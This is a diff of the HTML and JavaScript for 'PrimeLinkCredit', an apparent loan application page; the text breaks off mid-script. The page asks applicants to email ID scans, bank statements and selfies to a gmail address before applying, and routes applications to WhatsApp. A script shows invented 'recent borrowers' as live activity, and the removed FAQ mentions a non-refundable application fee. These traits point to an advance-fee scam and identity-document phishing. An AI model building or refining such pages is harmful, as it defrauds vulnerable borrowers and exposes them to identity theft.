@@ -4,222 +4,322 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>PrimeLinkCredit</title>
-
 <style>
-body{
-    margin:0;
-    font-family: "Segoe UI", Arial, sans-serif;
-    background:#f4f6f9;
-    color:#222;
+/* General body */
+body {
+    font-family: Arial, sans-serif;
+    background: #f0f2f5;
+    margin: 0;
+    padding: 0;
 }
 
-/* HEADER */
-header{
-    background:#0b1d3a;
-    padding:25px 15px;
-    text-align:center;
-    border-bottom:4px solid #c9a24d;
-}
-header h1{
-    margin:0;
-    font-size:32px;
-    color:#ffffff;
-    letter-spacing:1px;
-    font-weight:700;
+/* Header */
+header {
+    background: #0d1b2a;
+    padding: 30px 20px;
+    text-align: center;
+    border-bottom: 3px solid #c5a059;
 }
 
-/* MAIN CONTAINER */
-.container{
-    max-width:1000px;
-    margin:30px auto;
-    background:#ffffff;
-    padding:25px;
-    border-radius:10px;
-    box-shadow:0 10px 25px rgba(0,0,0,0.08);
+header img {
+    max-height: 180px;
+    width: auto;
+    display: block;
+    margin: auto;
+    border-radius: 10px;
 }
 
-h2{
-    color:#0b1d3a;
-    margin-top:40px;
+header div {
+    font-size: 32px;
+    font-weight: bold;
+    color: #ffffff;
+    margin-top: 10px;
 }
 
-/* FORM */
-label{
-    font-weight:600;
-    margin-top:15px;
-    display:block;
-}
-input, select, button{
-    width:100%;
-    padding:12px;
-    margin-top:6px;
-    border-radius:6px;
-    border:1px solid #ccc;
-    font-size:15px;
+/* Container */
+.container {
+    max-width: 900px;
+    margin: auto;
+    padding: 20px;
+    background: white;
+    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    border-radius: 8px;
+    margin-top: 20px;
 }
 
-button{
-    background:#c9a24d;
-    color:#0b1d3a;
-    font-weight:700;
-    border:none;
-    cursor:pointer;
-    margin-top:20px;
+/* Form */
+label { display:block; margin-top:15px; font-weight:bold; }
+select, input, button { width:100%; padding:10px; margin-top:5px; border-radius:5px; border:1px solid #ccc; font-size:16px; }
+
+/* Buttons */
+button {
+    background: #c5a059; 
+    color: #0d1b2a; 
+    font-weight: bold;
+    border: none;
+    cursor: pointer;
+    margin-top: 20px;
+    transition: background 0.3s;
 }
-button:hover{
-    background:#e1bb63;
+button:hover { background: #e2bc75; }
+button:disabled { background:#ccc; cursor:not-allowed; }
+
+/* Popup recent borrowers */
+.popup { margin-top:20px; background:#ecf0f1; padding:10px; border-radius:5px; height:160px; overflow-y:auto; font-size:14px; }
+
+/* Processing message */
+.processing { display:none; text-align:center; margin-top:20px; font-weight:bold; color:#e67e22; }
+
+/* Collapsible sections */
+.collapsible {
+    background-color: #0d1b2a;
+    color: white;
+    cursor: pointer;
+    padding: 14px;
+    width: 100%;
+    border: none;
+    text-align: left;
+    outline: none;
+    font-size: 18px;
+    margin-top:10px;
+    border-radius:5px;
 }
 
-/* SECTIONS */
-.section{
-    margin-top:50px;
-}
+.active, .collapsible:hover { background-color: #27476f; }
 
-.cards{
-    display:grid;
-    grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
-    gap:15px;
-}
-
-.card{
-    background:#f9fafc;
-    padding:18px;
-    border-radius:8px;
-    border-left:4px solid #c9a24d;
-}
-
-/* FAQ */
-.faq p{
-    margin:8px 0;
-}
-
-/* FOOTER */
-footer{
-    background:#0b1d3a;
-    color:#ffffff;
-    padding:35px 20px;
-    margin-top:60px;
-}
-footer h3{
-    margin-top:0;
-    color:#c9a24d;
-}
-footer p{
-    margin:6px 0;
-    font-size:14px;
-}
-footer .copyright{
-    margin-top:25px;
-    font-size:13px;
-    opacity:0.85;
+.content {
+    padding: 0 18px;
+    display: none;
+    overflow: hidden;
+    background-color: #f1f1f1;
+    border-radius: 5px;
+    margin-bottom:10px;
 }
 </style>
 </head>
-
 <body>
 
 <header>
-    <h1>PrimeLinkCredit</h1>
+  <img src="logo.png" alt="PrimeLinkCredit Logo">
+  <div>PrimeLinkCredit</div>
 </header>
 
 <div class="container">
 
-<p><strong>Before applying:</strong> Please send your identity documents (ID both sides, bank statement & selfie) to  
-<a href="mailto:PrimeLinkCredit@gmail.com">PrimeLinkCredit@gmail.com</a></p>
+<p>Before applying, please send your identity documents to: <a href="mailto:PrimeLinkCredit@gmail.com">PrimeLinkCredit@gmail.com</a></p>
 
-<label>Upload Documents:</label>
-<input type="file" multiple>
+<label for="uploadDocs">Upload Documents (ID both sides, Bank Statement, Selfie):</label>
+<input type="file" id="uploadDocs" multiple accept=".jpg,.png,.pdf">
+<button id="submitDocsBtn" style="display:none;">Submit Documents via Email</button>
 
-<label>Select Country:</label>
-<select>
-<option>Select country</option>
+<label>
+  <input type="checkbox" id="confirmDocs" disabled> I have sent my documents
+</label>
 
-<!-- 55 African Countries -->
-<option>🇰🇪 Kenya</option><option>🇳🇬 Nigeria</option><option>🇬🇭 Ghana</option><option>🇺🇬 Uganda</option>
-<option>🇹🇿 Tanzania</option><option>🇿🇦 South Africa</option><option>🇪🇬 Egypt</option><option>🇩🇿 Algeria</option>
-<option>🇲🇦 Morocco</option><option>🇪🇹 Ethiopia</option><option>🇷🇼 Rwanda</option><option>🇸🇳 Senegal</option>
-<option>🇨🇲 Cameroon</option><option>🇨🇮 Côte d’Ivoire</option><option>🇿🇲 Zambia</option><option>🇿🇼 Zimbabwe</option>
-<option>🇧🇼 Botswana</option><option>🇳🇦 Namibia</option><option>🇲🇼 Malawi</option><option>🇲🇿 Mozambique</option>
-<option>🇨🇩 DRC</option><option>🇸🇸 South Sudan</option><option>🇸🇩 Sudan</option><option>🇸🇴 Somalia</option>
-<option>🇧🇯 Benin</option><option>🇧🇫 Burkina Faso</option><option>🇹🇬 Togo</option><option>🇳🇪 Niger</option>
-<option>🇲🇱 Mali</option><option>🇲🇷 Mauritania</option><option>🇱🇷 Liberia</option><option>🇸🇱 Sierra Leone</option>
-<option>🇬🇲 Gambia</option><option>🇬🇦 Gabon</option><option>🇨🇬 Congo</option><option>🇨🇻 Cape Verde</option>
-<option>🇨🇫 Central African Rep.</option><option>🇩🇯 Djibouti</option><option>🇪🇷 Eritrea</option><option>🇬🇳 Guinea</option>
-<option>🇬🇼 Guinea-Bissau</option><option>🇱🇸 Lesotho</option><option>🇱🇾 Libya</option>
-<option>🇲🇬 Madagascar</option><option>🇸🇿 Eswatini</option><option>🇸🇹 São Tomé</option>
-<option>🇸🇨 Seychelles</option><option>🇹🇳 Tunisia</option>
+<label for="countrySelect">Select your country:</label>
+<select id="countrySelect" disabled>
+  <option value="">Select your country</option>
+  <!-- 55 African Countries -->
+  <option value="DZ" data-code="+213" data-currency="DZD">🇩🇿 Algeria</option>
+  <option value="AO" data-code="+244" data-currency="AOA">🇦🇴 Angola</option>
+  <option value="BJ" data-code="+229" data-currency="XOF">🇧🇯 Benin</option>
+  <option value="BW" data-code="+267" data-currency="BWP">🇧🇼 Botswana</option>
+  <option value="BF" data-code="+226" data-currency="XOF">🇧🇫 Burkina Faso</option>
+  <option value="BI" data-code="+257" data-currency="BIF">🇧🇮 Burundi</option>
+  <option value="CM" data-code="+237" data-currency="XAF">🇨🇲 Cameroon</option>
+  <option value="CV" data-code="+238" data-currency="CVE">🇨🇻 Cape Verde</option>
+  <option value="CF" data-code="+236" data-currency="XAF">🇨🇫 Central African Republic</option>
+  <option value="TD" data-code="+235" data-currency="XAF">🇹🇩 Chad</option>
+  <option value="KM" data-code="+269" data-currency="KMF">🇰🇲 Comoros</option>
+  <option value="CD" data-code="+243" data-currency="CDF">🇨🇩 Congo (DRC)</option>
+  <option value="CG" data-code="+242" data-currency="XAF">🇨🇬 Congo (Republic)</option>
+  <option value="CI" data-code="+225" data-currency="XOF">🇨🇮 Côte d’Ivoire</option>
+  <option value="DJ" data-code="+253" data-currency="DJF">🇩🇯 Djibouti</option>
+  <option value="EG" data-code="+20" data-currency="EGP">🇪🇬 Egypt</option>
+  <option value="GQ" data-code="+240" data-currency="XAF">🇬🇶 Equatorial Guinea</option>
+  <option value="ER" data-code="+291" data-currency="ERN">🇪🇷 Eritrea</option>
+  <option value="SZ" data-code="+268" data-currency="SZL">🇸🇿 Eswatini</option>
+  <option value="ET" data-code="+251" data-currency="ETB">🇪🇹 Ethiopia</option>
+  <option value="GA" data-code="+241" data-currency="XAF">🇬🇦 Gabon</option>
+  <option value="GM" data-code="+220" data-currency="GMD">🇬🇲 Gambia</option>
+  <option value="GH" data-code="+233" data-currency="GHS">🇬🇭 Ghana</option>
+  <option value="GN" data-code="+224" data-currency="GNF">🇬🇳 Guinea</option>
+  <option value="GW" data-code="+245" data-currency="XOF">🇬🇼 Guinea-Bissau</option>
+  <option value="KE" data-code="+254" data-currency="KES">🇰🇪 Kenya</option>
+  <option value="LS" data-code="+266" data-currency="LSL">🇱🇸 Lesotho</option>
+  <option value="LR" data-code="+231" data-currency="LRD">🇱🇷 Liberia</option>
+  <option value="LY" data-code="+218" data-currency="LYD">🇱🇾 Libya</option>
+  <option value="MG" data-code="+261" data-currency="MGA">🇲🇬 Madagascar</option>
+  <option value="MW" data-code="+265" data-currency="MWK">🇲🇼 Malawi</option>
+  <option value="ML" data-code="+223" data-currency="XOF">🇲🇱 Mali</option>
+  <option value="MR" data-code="+222" data-currency="MRU">🇲🇷 Mauritania</option>
+  <option value="MU" data-code="+230" data-currency="MUR">🇲🇺 Mauritius</option>
+  <option value="MA" data-code="+212" data-currency="MAD">🇲🇦 Morocco</option>
+  <option value="MZ" data-code="+258" data-currency="MZN">🇲🇿 Mozambique</option>
+  <option value="NA" data-code="+264" data-currency="NAD">🇳🇦 Namibia</option>
+  <option value="NE" data-code="+227" data-currency="XOF">🇳🇪 Niger</option>
+  <option value="NG" data-code="+234" data-currency="NGN">🇳🇬 Nigeria</option>
+  <option value="RW" data-code="+250" data-currency="RWF">🇷🇼 Rwanda</option>
+  <option value="ST" data-code="+239" data-currency="STN">🇸🇹 São Tomé & Príncipe</option>
+  <option value="SN" data-code="+221" data-currency="XOF">🇸🇳 Senegal</option>
+  <option value="SC" data-code="+248" data-currency="SCR">🇸🇨 Seychelles</option>
+  <option value="SL" data-code="+232" data-currency="SLL">🇸🇱 Sierra Leone</option>
+  <option value="SO" data-code="+252" data-currency="SOS">🇸🇴 Somalia</option>
+  <option value="ZA" data-code="+27" data-currency="ZAR">🇿🇦 South Africa</option>
+  <option value="SS" data-code="+211" data-currency="SSP">🇸🇸 South Sudan</option>
+  <option value="SD" data-code="+249" data-currency="SDG">🇸🇩 Sudan</option>
+  <option value="TZ" data-code="+255" data-currency="TZS">🇹🇿 Tanzania</option>
+  <option value="TG" data-code="+228" data-currency="XOF">🇹🇬 Togo</option>
+  <option value="TN" data-code="+216" data-currency="TND">🇹🇳 Tunisia</option>
+  <option value="UG" data-code="+256" data-currency="UGX">🇺🇬 Uganda</option>
+  <option value="ZM" data-code="+260" data-currency="ZMW">🇿🇲 Zambia</option>
+  <option value="ZW" data-code="+263" data-currency="ZWL">🇿🇼 Zimbabwe</option>
 
-<!-- 10 International -->
-<option>🇺🇸 United States</option><option>🇬🇧 United Kingdom</option><option>🇨🇦 Canada</option>
-<option>🇦🇺 Australia</option><option>🇩🇪 Germany</option><option>🇫🇷 France</option>
-<option>🇯🇵 Japan</option><option>🇨🇳 China</option><option>🇮🇳 India</option><option>🇶🇦 Qatar</option>
+  <!-- 10 International Countries -->
+  <option value="US" data-code="+1" data-currency="USD">🇺🇸 United States</option>
+  <option value="GB" data-code="+44" data-currency="GBP">🇬🇧 United Kingdom</option>
+  <option value="CA" data-code="+1" data-currency="CAD">🇨🇦 Canada</option>
+  <option value="AU" data-code="+61" data-currency="AUD">🇦🇺 Australia</option>
+  <option value="DE" data-code="+49" data-currency="EUR">🇩🇪 Germany</option>
+  <option value="FR" data-code="+33" data-currency="EUR">🇫🇷 France</option>
+  <option value="JP" data-code="+81" data-currency="JPY">🇯🇵 Japan</option>
+  <option value="CN" data-code="+86" data-currency="CNY">🇨🇳 China</option>
+  <option value="IN" data-code="+91" data-currency="INR">🇮🇳 India</option>
+  <option value="QA" data-code="+974" data-currency="QAR">🇶🇦 Qatar</option>
 </select>
 
-<label>Full Name:</label>
-<input type="text">
+<label for="fullName">Full Name:</label>
+<input type="text" id="fullName" placeholder="Enter your full name" required>
 
-<label>Loan Amount:</label>
-<input type="number">
+<label for="amount">Loan Amount:</label>
+<input type="number" id="amount" placeholder="Enter loan amount" min="1000">
 
-<label>Loan Duration:</label>
-<select>
-<option>Monthly – 3%</option>
-<option>Yearly – 9%</option>
+<label for="durationType">Loan Duration Type:</label>
+<select id="durationType">
+  <option value="">Select Type</option>
+  <option value="monthly">Monthly (3% / month)</option>
+  <option value="yearly">Yearly (9% / year)</option>
 </select>
 
-<label>WhatsApp Number:</label>
-<input type="text" placeholder="+254">
+<label for="durationValue">Duration:</label>
+<select id="durationValue" disabled>
+  <option value="">Select duration</option>
+</select>
 
-<button onclick="window.open('https://wa.me/254101965027','_blank')">
-Apply via WhatsApp
-</button>
+<label for="whatsapp">WhatsApp Number:</label>
+<input type="text" id="whatsapp" placeholder="WhatsApp number starting with country code">
 
-<!-- WHY US -->
-<div class="section">
-<h2>Why Choose PrimeLinkCredit</h2>
-<div class="cards">
-<div class="card">✅ Fast loan approval</div>
-<div class="card">✅ Transparent interest rates</div>
-<div class="card">✅ Secure document handling</div>
-<div class="card">✅ Africa & international coverage</div>
-</div>
-</div>
+<button id="applyBtn" disabled>Apply via WhatsApp</button>
 
-<!-- HOW IT WORKS -->
-<div class="section">
-<h2>How It Works</h2>
-<div class="cards">
-<div class="card">1️⃣ Submit application & documents</div>
-<div class="card">2️⃣ Review & verification</div>
-<div class="card">3️⃣ Approval confirmation</div>
-<div class="card">4️⃣ Funds disbursement</div>
-</div>
+<div class="processing" id="processing">Processing, please wait...</div>
+<div class="popup" id="popup"></div>
+
+<!-- Collapsible Sections -->
+<button type="button" class="collapsible">Why Choose PrimeLinkCredit?</button>
+<div class="content">
+  <p>PrimeLinkCredit is trusted across multiple countries. Our loans are fast, safe, and transparent. We provide personal attention and flexible durations to suit your needs.</p>
 </div>
 
-<!-- FAQ -->
-<div class="section faq">
-<h2>Frequently Asked Questions</h2>
-<p><strong>How long does approval take?</strong><br>Within 24–48 hours after verification.</p>
-<p><strong>Is the application fee refundable?</strong><br>No. It covers processing & verification.</p>
-<p><strong>Which countries do you serve?</strong><br>55 African countries & selected international locations.</p>
-<p><strong>Are my documents safe?</strong><br>Yes. All data is handled confidentially.</p>
+<button type="button" class="collapsible">Frequently Asked Questions</button>
+<div class="content">
+  <p>Q1: How long does it take to get the loan?<br>A1: Usually within 24 hours after document verification.</p>
+  <p>Q2: What documents are required?<br>A2: Valid ID, bank statement, and a selfie.</p>
 </div>
 
+<!-- Footer -->
+<div class="container" style="margin-top:20px;text-align:center;">
+  <h3>Grow with PrimeLinkCredit</h3>
+  <p>PrimeLinkCredit is much deeper than just business. Our goal is to help you get the cash you need right when you need it most.</p>
+  <p>Contacts:<br>
+  P.O. Box 13314-00200, Nairobi<br>
+  020 33 49 198<br>
+  PrimeLinkCredit@gmail.com</p>
+  <p>Copyright © 2026 PrimeLinkCredit</p>
 </div>
 
-<footer>
-<h3>Grow with PrimeLinkCredit</h3>
-<p>PrimeLinkCredit is more than just business. Our goal is to help you access the funds you need exactly when you need them.</p>
+<script>
+// Elements
+const applyBtn = document.getElementById('applyBtn');
+const processing = document.getElementById('processing');
+const popup = document.getElementById('popup');
+const countrySelect = document.getElementById('countrySelect');
+const durationType = document.getElementById('durationType');
+const durationValue = document.getElementById('durationValue');
+const amount = document.getElementById('amount');
+const fullName = document.getElementById('fullName');
+const whatsapp = document.getElementById('whatsapp');
+const uploadDocs = document.getElementById('uploadDocs');
+const submitDocsBtn = document.getElementById('submitDocsBtn');
+const confirmDocs = document.getElementById('confirmDocs');
 
-<p><strong>Contacts</strong></p>
-<p>P.O. Box 13314-00200, Nairobi</p>
-<p>📞 020 33 49 198</p>
-<p>📧 PrimeLinkCredit@gmail.com</p>
+// Upload docs logic
+uploadDocs.addEventListener('change', () => {
+  submitDocsBtn.style.display = uploadDocs.files.length > 0 ? 'block' : 'none';
+  confirmDocs.checked = false;
+  confirmDocs.disabled = true;
+  applyBtn.disabled = true;
+});
 
-<div class="copyright">
-Copyright © 2026 PrimeLinkCredit
-</div>
-</footer>
+// Submit docs
+submitDocsBtn.addEventListener('click', () => {
+  if (!uploadDocs.files.length) { alert("Select documents first"); return; }
+  let names = Array.from(uploadDocs.files).map(f => f.name).join(', ');
+  window.location.href = `mailto:PrimeLinkCredit@gmail.com?subject=Loan Docs Submission&body=Attached: ${names}`;
+  confirmDocs.disabled = false;
+});
 
-</body>
-</html>
+// Enable fields after confirming
+confirmDocs.addEventListener('change', () => {
+  countrySelect.disabled = !confirmDocs.checked;
+  durationType.disabled = !confirmDocs.checked;
+  applyBtn.disabled = !confirmDocs.checked;
+});
+
+// Duration options
+durationType.addEventListener('change', () => {
+  durationValue.disabled = false;
+  durationValue.innerHTML = '<option value="">Select duration</option>';
+  if (durationType.value === 'monthly') {
+    for (let i=1;i<=12;i++) durationValue.innerHTML += `<option value="${i}" data-interest="3">${i} month(s)</option>`;
+  } else if (durationType.value === 'yearly') {
+    for (let i=1;i<=10;i++) durationValue.innerHTML += `<option value="${i}" data-interest="9">${i} year(s)</option>`;
+  }
+});
+
+// Auto-fill WhatsApp code
+countrySelect.addEventListener('change', () => {
+  whatsapp.value = countrySelect.options[countrySelect.selectedIndex].dataset.code;
+});
+
+// Recent borrowers popup
+const namesList = [
+  {name:'Mohamed K.', country:'TZ', amount:300000, code:'+255'},
+  {name:'Aisha M.', country:'KE', amount:15000, code:'+254'},
+  {name:'John D.', country:'US', amount:5000, code:'+1'},
+  {name:'Fatima R.', country:'NG', amount:20000, code:'+234'},
+  {name:'Sara L.', country:'GB', amount:10000, code:'+44'},
+];
+let idx=0;
+setInterval(()=>{
+  const p=namesList[idx%namesList.length];
+  popup.innerHTML=`<div>📌 ${p.name} ${p.code} ${p.country} borrowed ${p.amount} ⏱ just now</div>`;
+  idx++;
+},1000);
+
+// Apply via WhatsApp
+applyBtn.addEventListener('click',()=>{
+  if (!fullName.value || !amount.value || !countrySelect.value || !whatsapp.value || !durationValue.value) {
+    alert("Please complete all fields");
+    return;
+  }
+  processing.style.display='block';
+  setTimeout(()=>{
+    const interestRate=parseFloat(durationValue.options[durationValue.selectedIndex].dataset.interest);
+    const dVal=parseFloat(durationValue.value);
+    const interest=dVal*(interestRate/100)*parseFloat(amount.value);
+    const serviceFee=(parseFloat(amount.value)<10000?0.10:parseFloat(amount.value)<50000?0.08:parseFloat(amount.value)<100000?0.06:0.05)*parseFloat(amount.value);
+    const totalPay=parseFloat(amount.value)+interest+serviceFee;
+    const country=countrySelect.value;
+    const currency=countrySelect.options[countrySelect.selectedIndex].dataset.currency;
+    const msg=`Hello PrimeLinkCredit,
+Name: ${fullName.value
